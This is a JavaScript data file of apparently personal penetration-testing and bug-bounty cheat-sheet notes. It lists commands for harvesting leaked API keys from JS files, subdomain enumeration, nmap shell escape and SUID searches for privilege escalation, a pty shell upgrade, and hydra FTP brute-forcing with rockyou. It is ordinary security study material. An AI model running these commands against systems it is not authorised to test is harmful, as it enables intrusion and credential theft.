...
const mynotes = [
  ...
  },
  {
    ...
    notes:
      "<br><h2>find all JS files</h2><br><code>katana -u sub.domain.com</code><br><code>katana -u domain.com > website_all_js_files.txt</code><br><br><h2>find secret info</h2><br><code>cat website_all_js_files.txt | while read url; do python3 SecretFinder.py -i $url -o cli; done</code><br><br>find any paid api key - that is vulnerable<br><br>manualy test that api's then write a report",
    description:
      "leak, sensitive, information, disclosure, katana, secretfinder",
  },
  {
  ...
  },
  {
    ...
    notes:
      "<code>pip install -r requirements.txt<br>pip3 install -r requirements.txt</code><br>",
    description: "requirements.txt, install",
  },
  {
    header: "Convert md5 hashing",
    notes:
      "<h4>convert to md5</h4> <code>for word in $(cat wordlist.txt); do echo -n \"$word\" | md5sum | awk '{print $1}' >> md5.txt; done<code>",
    description: "md5, hashing, convert",
  },
  {
    header: "gobuster subdomain enum",
    notes:
      "<h4>bruteforce</h4><code>gobuster dns -d example.com -w word_list.txt</code><br><code>gobuster dns -d example.com -w word_list.txt-i</code> <br><br><p>i - ip address</p>",
    description: "gobuster, subdomain, enum",
  },
  {
    header: "subdomain enum",
    notes:
      "<h4>gobuster</h4><code>gobuster dns -d example.com -w word_list.txt</code><br><h4>subbrute</h4><code>python3 subbrute.py -p example.com -c 16</code><br><p>-p : optional (DNS records)<br>-c : threads (max 16)</p><br> <h4>subfinder</h4><code>subfinder -d example.com</code><br><h4>assetfinder</h4><code>assetfinder --subs-only example.com</code><br><br>",
    description: "subdomain, enum",
  },
  {
    header: "privilege escalation",
    notes:
      "<h4>nmap privilege escalation</h4><code>nmap --interactive</code><br><code>nmap>!sh</code> <br><br>",
    description: "nmap, privilege, escalation ",
  },
  {
    header: "privilege escalation find SUID files",
    notes:
      "<h4>find SUID (find command for get privilege)</h4><code>find / -perm -u=s -type f 2>/dev/null</code> <br><br><code>find / -perm -g=s -type f 2>/dev/null</code><br><br><code>find / -perm -g=s -o -perm -u=s -type f 2>/dev/null</code><br><br><code>find /home -writable -type d 2>/dev/null</code><br><br><code>find . -type f -perm 0777 -print</code><br><br>",
  ...
  },
  {
    ...
    notes:
      "<h4>sort private bugbounty</h4><code>inurl: /bugbounty insite:lk</code><br><br>",
    description: "sort,private,bugbounty,google,dorks",
  },
  {
    header: "upgrading pty with python",
    notes:
      "<h4>python pty</h4><code>python -c 'import pty;pty.spawn('/bin/bash')'</code><br><br>",
    description: "upgrading, tty, pty, putty",
  },
  {
    header: "FTP bruteforce with hydra",
    notes:
      "<h4>ftp bruteforce</h4><code>hydra -l uname -P rockyou.txt ftp://10.10.9.10</code><br><br>",
    description: "hydra, ftp, bruteforce",
  },
  {
    header: "filter wordlist, sorting wordlist",
    notes:
      "<h4>ftp bruteforce</h4><code>grep -E '^.{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</code><br><br><code>grep -E '^[[:alnum:]]{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</code><br><br><code>grep -E '^[[:alpha:]]{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</code><br><br><code>grep -E '^[[:upper:]]{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</code><br><br><code>grep -E '^[[:lower:]]{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</code><br><br><code>grep -E '^[[:digit:]]{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</code><br><br>",
    description: "filter, sorting, wordlist, rockyou, grep -E",
  },
  {
    header: "Python HTTP server",
    notes:
      "<h4>start python http server</h4><code>python -m http.server port_num</code><br><br>",
    description: "python, http, server",
  },
  {
    header: "Connect with SSH key",
    notes:
      "<h4>connect with ssh</h4><code>chmod id_rsa 600</code><br><br><code>ssh user@<ip_add> -i id_rsa</code>",
